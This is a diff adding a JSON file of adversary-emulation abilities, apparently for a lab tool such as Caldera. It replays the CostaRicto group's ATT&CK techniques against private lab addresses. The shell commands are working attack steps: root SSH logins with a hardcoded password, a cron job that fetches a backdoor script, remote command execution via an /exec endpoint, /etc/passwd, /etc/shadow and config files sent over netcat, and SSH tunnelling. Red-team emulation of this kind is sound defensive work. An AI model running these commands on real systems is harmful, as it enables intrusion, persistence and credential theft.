@@ -1,0 +1,167 @@
+[
+  {
+    "ability_id": "1067ff73-566d-5b59-97b5-36d0aebbe283",
+    "name": "T1046 - Network Service Discovery",
+    "tactic": "discovery",
+    "technique_name": "Network Service Discovery",
+    "technique_id": "T1046",
+    "description": "During CostaRicto, the threat actors employed nmap and pscan to scan target environments.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "nmap -sS -p 22,80,443 172.21.0.20 && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'nmap -sS -p 22,80,443 172.22.0.20'"
+      }
+    ]
+  },
+  {
+    "ability_id": "6d16f57a-875a-5c79-bc74-96c744d79d21",
+    "name": "T1105 - Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "technique_name": "Ingress Tool Transfer",
+    "technique_id": "T1105",
+    "description": "During CostaRicto, the threat actors downloaded malware and tools onto a compromised host.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "echo 'ThisIsATestFile' > /tmp/malware.bin && curl http://172.21.0.20:8018/malware.bin -o /tmp/malware.bin"
+      }
+    ]
+  },
+  {
+    "ability_id": "73e1cb59-a495-57bf-9235-76cba14b3113",
+    "name": "T1090.003 - Multi-hop Proxy",
+    "tactic": "command-and-control",
+    "technique_name": "Multi-hop Proxy",
+    "technique_id": "T1090.003",
+    "description": "During CostaRicto, the threat actors used a layer of proxies to manage C2 communications.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl --proxy http://172.21.0.20:8888 http://172.22.0.20"
+      }
+    ]
+  },
+  {
+    "ability_id": "708775d0-507e-5b5c-b811-04ccf20f3685",
+    "name": "T1053.005 - Scheduled Task",
+    "tactic": "execution",
+    "technique_name": "Scheduled Task",
+    "technique_id": "T1053.005",
+    "description": "During CostaRicto, the threat actors used scheduled tasks to download backdoor tools.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"wget http://localhost/backdor.sh\" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"* * * * * root /root/backdoor_task.sh\" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'"
+      }
+    ]
+  },
+  {
+    "ability_id": "5c0eccee-eee4-5d88-b6e5-c83b25d44eaa",
+    "name": "T1588.002 - Tool",
+    "tactic": "resource-development",
+    "technique_name": "Tool",
+    "technique_id": "T1588.002",
+    "description": "During CostaRicto, the threat actors obtained open source tools to use in their operations.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh root@172.21.0.20 \"nmap localhost\""
+      }
+    ]
+  },
+  {
+    "ability_id": "53507c5c-0553-5a8a-94b9-e036797af17e",
+    "name": "T1133 - External Remote Services",
+    "tactic": "persistence",
+    "technique_name": "External Remote Services",
+    "technique_id": "T1133",
+    "description": "During CostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20"
+      }
+    ]
+  },
+  {
+    "ability_id": "3f3cb5a5-c06a-5c56-a724-22283ae8bd02",
+    "name": "T1583.001 - Domains",
+    "tactic": "resource-development",
+    "technique_name": "Domains",
+    "technique_id": "T1583.001",
+    "description": "For CostaRicto, the threat actors established domains, some of which appeared to spoof legitimate domains.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "dig @172.21.0.20 www.maliciousdomain.local +short"
+      }
+    ]
+  },
+  {
+    "ability_id": "cb737a7e-db82-50cc-9b06-17d18b1ca5ae",
+    "name": "T1587.001 - Malware",
+    "tactic": "resource-development",
+    "technique_name": "Malware",
+    "technique_id": "T1587.001",
+    "description": "For CostaRicto, the threat actors used custom malware, including PS1, CostaBricks, and SombRAT.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
+      }
+    ]
+  },
+  {
+    "ability_id": "893ff01b-860d-5144-b719-4139ad885e45",
+    "name": "T1005 - Data from Local System",
+    "tactic": "collection",
+    "technique_name": "Data from Local System",
+    "technique_id": "T1005",
+    "description": "During CostaRicto, the threat actors collected data and files from compromised networks.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl http://172.21.0.20:4444/ -s -o /tmp/resp; echo 'cat /etc/passwd' | nc -w 2 172.21.0.20 4545; echo 'cat /etc/shadow' | nc -w 2 172.21.0.20 4444; echo 'find / -type f -name \"*.conf\" -exec cat {} \\;' | nc -w 2 172.21.0.20 4444"
+      }
+    ]
+  },
+  {
+    "ability_id": "a6ff75c3-d8e0-5cbf-9ea3-3225ac227aff",
+    "name": "T1572 - Protocol Tunneling",
+    "tactic": "command-and-control",
+    "technique_name": "Protocol Tunneling",
+    "technique_id": "T1572",
+    "description": "During CostaRicto, the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "fuser -k 2222/tcp 2>/dev/null; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -L 2222:172.22.0.20:22 root@172.21.0.20 -N & TUNNEL_PID=$!; sleep 5; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost -p 2222 id; kill $TUNNEL_PID"
+      }
+    ]
+  },
+  {
+    "ability_id": "a6ff75c3-d8e0-5cbf-9ea3-roth",
+    "name": "END OF EMULATION",
+    "tactic": "impact",
+    "technique_name": "System Shutdown",
+    "technique_id": "T1529",
+    "description": "This is the end.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "echo \"END OF COSTARICTO\""
+      }
+    ]
+  }    
+]
